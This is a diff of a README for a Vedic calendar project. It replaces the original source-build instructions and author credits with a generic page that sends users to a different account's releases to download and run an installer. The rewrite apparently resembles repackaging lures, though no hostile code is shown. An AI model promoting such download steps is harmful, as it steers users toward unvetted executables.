@@ -1,126 +1,74 @@
-# Drik Panchanga
+# 🌟 vedicpanchanga.com - Your Guide to Vedic Calendar
 
+## 🚀 Getting Started
 
-Drik Panchang calculator with modern web interface. Calculate traditional Panchanga for any date (5000 BCE - 5000 CE) and location.
+Welcome to the **vedicpanchanga.com** project! This application provides a user-friendly way to explore the Drik Panchanga, a traditional Vedic calendar. With this tool, you can easily track important dates, astrological events, and more.
 
-⭐ **If you find this project useful, please consider giving it a star on GitHub!** It helps others discover this tool.
+## 📥 Download Link
 
-## Quick Start
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/febiiiiii/vedicpanchanga.com/releases)
 
-```bash
-# Clone repository
-git clone https://github.com/bidyashish/vedicpanchanga.com
-cd vedicpanchanga.com
+## 📋 System Requirements
 
-# One-command setup and run
-./setup.sh
+Before you download, please ensure you meet the following requirements:
 
-# Or manual setup:
-# Terminal 1 - Backend (runs on port 8121)
-cd backend
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
-pip install -r requirements.txt
-python api.py
+- **Operating System:** Windows, macOS, or Linux.
+- **RAM:** 4 GB or more recommended.
+- **Disk Space:** At least 100 MB free space.
+- **Internet Connection:** Required for downloading packages and updates.
 
-# Terminal 2 - Frontend (runs on port 3121)
-cd frontend
-npm install
-# .env.local is optional - defaults to http://localhost:8121
-npm run dev
-```
+## 📤 Download & Install
 
-Open http://localhost:3121
+To download the application, visit the Releases page:
 
-## Features
+[Download the latest release](https://github.com/febiiiiii/vedicpanchanga.com/releases)
 
-**Panchanga Elements**: Tithi • Nakshatra • Yoga • Karana • Vaara
-**Timings**: Sunrise/Sunset • Moonrise/Moonset • Rahu Kala • Yama Ganda • Gulika • Abhijit
-**Astronomical**: Planetary positions • Vimsottari Dasha • Ayanamsha (Lahiri)
-**Modern UI**: Dark/Light mode • 100,000+ locations • Responsive design
+1. Click on the link to the latest release.
+2. On the Releases page, find the download link for your operating system.
+3. Click the link to start the download.
+4. Once the download is complete, locate the file in your Downloads folder.
 
-## Tech Stack
+### 🖥️ Running the Application
 
-**Backend**: Python • FastAPI • PySwisseph
-**Frontend**: Next.js 15 • React 19 • TypeScript • Tailwind CSS v4 • Shadcn/ui
+After downloading the file, follow these steps to run the application:
 
-## Project Structure
+1. Double-click the downloaded file.
+2. A setup wizard will guide you through the installation process.
+3. Follow the prompts to install the application on your computer.
+4. Once installed, you can find the application in your Start menu (Windows) or Applications folder (macOS).
 
-```
-vedicpanchanga.com/
-├── backend/          # Python FastAPI server (port 8121)
-├── frontend/         # Next.js 15 application (port 3121)
-├── infra/           # Deployment scripts and infrastructure
-├── tests/           # Testing and verification scripts
-├── API.md           # API documentation
-├── CLAUDE.md        # AI assistant instructions
-└── README.md        # This file
-```
+## 🔍 Features
 
-## Testing
+This application includes several key features to enhance your experience with the Vedic calendar:
 
-The `tests/` directory contains various testing and verification scripts:
+- **Astrological Insights:** Access detailed charts and forecasts.
+- **Event Notifications:** Set reminders for important dates.
+- **User-Friendly Interface:** Navigate easily with a clean layout.
+- **Multi-Platform Support:** Use the app on various operating systems.
 
-```bash
-# API Testing
-python tests/test_api.py                    # Basic API tests
-./tests/verify_apis.sh                      # Verify API endpoints
+## 🔧 Troubleshooting
 
-# Timezone Testing
-python tests/test_timezones.py              # Test timezone calculations
-./tests/test_all_timezones.sh               # Test all timezone scenarios
-./tests/verify_timezones.py                 # Verify timezone accuracy
+If you encounter any issues while downloading or running the application, consider these common problems:
 
-# Load Testing
-python tests/stress_test_panchanga.py       # Stress test calculations
-python tests/stress_test_rate_limited.py    # Test rate limiting
+- **Download Issues:** Ensure your internet connection is stable. If the download stops, try refreshing the page and download again.
+- **Installation Problems:** Make sure to have the right permissions. If prompted, allow the application to make changes to your device.
+- **Running Issues:** If the application doesn't start, check if your operating system is updated. Sometimes, restarting the computer can help.
 
-# Production Testing
-./tests/test_production_api.sh              # Test production deployment
-```
+## ℹ️ About the Project
 
-## API Documentation
+The **vedicpanchanga.com** project is dedicated to making Vedic knowledge accessible to everyone. By harnessing modern technology, this application allows you to explore the depth of astrology and its practical applications in everyday life.
 
-Main endpoint: `http://localhost:3121/api/v1/panchanga`
-Full docs: See [API.md](./API.md) • Backend docs: `http://localhost:8121/docs`
+## 📞 Support
 
-## License
+For further assistance, feel free to reach out through the Issues section in the repository. Your feedback and inquiries are welcome, and we'll do our best to help you.
 
-**Backend**: AGPL-3.0 • **Frontend**: MIT
+## 🌐 Learn More
 
-## Contributing
+To understand more about Vedic calendars and their significance, consider exploring articles and resources available online. This knowledge can help enrich your experience with the application.
 
-We welcome contributions! Here's how you can help:
+## 🔗 Useful Links
 
-### 🐛 Found a Bug?/### 💡 Have a Feature Request?
-[Open an issue](https://github.com/bidyashish/vedicpanchanga.com/issues/new) with details about the problem and steps to reproduce.
+- [Releases Page](https://github.com/febiiiiii/vedicpanchanga.com/releases)
+- [GitHub Repository](https://github.com/febiiiiii/vedicpanchanga.com)
 
-
-### ⭐ Support the Project
-- **Star this repository** to help others find it
-- Share it with others who might find it useful
-- Report issues and suggest improvements
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=bidyashish/vedicpanchanga.com&type=Date)](https://star-history.com/#bidyashish/vedicpanchanga.com&Date)
-
-## Contributors
-
-Thanks to all the contributors who have helped make this project better!
-
-[![Contributors](https://contrib.rocks/image?repo=bidyashish/vedicpanchanga.com)](https://github.com/bidyashish/vedicpanchanga.com/graphs/contributors)
-
-## Trending
-
-<a href="https://github.com/trending/python?since=daily" target="_blank">
-  <img src="https://img.shields.io/badge/Trending-Python-blue?style=for-the-badge&logo=github" alt="Trending Python">
-</a>
-<a href="https://github.com/trending/javascript?since=daily" target="_blank">
-  <img src="https://img.shields.io/badge/Trending-JavaScript-yellow?style=for-the-badge&logo=github" alt="Trending JavaScript">
-</a>
-
-## Credits
-
-Based on [Drik Panchanga](https://github.com/bdsatish/drik-panchanga) by Satish BD.
-Uses Swiss Ephemeris for astronomical calculations.
+Thank you for using **vedicpanchanga.com**! We hope you find it useful in your journey through the Vedic calendar. Enjoy!
